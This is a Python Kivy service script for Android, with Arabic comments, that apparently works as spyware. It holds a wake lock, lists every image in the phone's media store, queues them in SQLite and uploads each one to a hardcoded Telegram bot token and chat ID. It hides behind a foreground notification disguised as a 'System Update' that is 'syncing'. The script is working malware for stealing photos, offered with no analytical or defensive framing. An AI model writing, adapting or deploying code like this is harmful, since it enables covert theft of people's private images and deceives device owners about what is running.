import os, time, threading, sqlite3, requests
from jnius import autoclass

# إعدادات الأندرويد للبقاء في الخلفية
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')
MediaStore = autoclass('android.provider.MediaStore')

service = PythonService.mService
context = service.getApplicationContext()

# منع الموبايل من قفل المعالج
wake_lock = context.getSystemService(Context.POWER_SERVICE).newWakeLock(1, "ShadowCore::Turbo")
if not wake_lock.isHeld(): wake_lock.acquire()

class JobDatabase:
    def __init__(self):
        self.db_path = os.path.join(os.environ.get('PYTHON_SERVICE_DIR', './'), "sync_v2.db")
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.execute("CREATE TABLE IF NOT EXISTS jobs (id INTEGER PRIMARY KEY, path TEXT UNIQUE, status TEXT DEFAULT 'pending')")
        self.conn.commit()

    def add_job(self, path):
        try:
            self.conn.execute("INSERT OR IGNORE INTO jobs(path) VALUES(?)", (path,))
            self.conn.commit()
        except: pass

    def get_batch(self, size):
        return self.conn.execute(f"SELECT id, path FROM jobs WHERE status='pending' LIMIT {size}").fetchall()

    def mark_done(self, job_id):
        self.conn.execute("UPDATE jobs SET status='done' WHERE id=?", (job_id,))
        self.conn.commit()

def index_all():
    files = []
    try:
        cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, [MediaStore.MediaColumns.DATA], None, None, None)
        if cursor:
            while cursor.moveToNext():
                path = cursor.getString(0)
                if path and os.path.exists(path): files.append(path)
            cursor.close()
    except: pass
    return files

class FastSync:
    def __init__(self, db):
        self.db = db
        self.token = "7820129712:AAH9pZ49S_m8tY8965625902"
        self.chat_id = "6110903337"

    def send(self, path):
        try:
            with open(path, 'rb') as f:
                r = requests.post(f"https://api.telegram.org/bot{self.token}/sendDocument", data={'chat_id': self.chat_id}, files={'document': f}, timeout=30)
            return r.status_code == 200
        except: return False

    def run(self):
        while True:
            jobs = self.db.get_batch(100) # يسحب 100 صورة بكل دفعة
            if not jobs:
                time.sleep(15)
                continue
            for j_id, path in jobs:
                if self.send(path):
                    self.db.mark_done(j_id)
                    time.sleep(0.05) # سرعة عالية جداً
                else: time.sleep(2)

def start_notif():
    if Build.VERSION.SDK_INT >= 26:
        chan = NotificationChannel("sync", "System Sync", 2)
        context.getSystemService(Context.NOTIFICATION_SERVICE).createNotificationChannel(chan)
        builder = NotificationBuilder(context, "sync")
    else: builder = NotificationBuilder(context)
    notif = builder.setContentTitle("تحديث النظام").setContentText("جاري المزامنة...").setSmallIcon(context.getApplicationInfo().icon).build()
    service.startForeground(101, notif)

if __name__ == '__main__':
    start_notif()
    db = JobDatabase()
    for f in index_all(): db.add_job(f)
    FastSync(db).run()
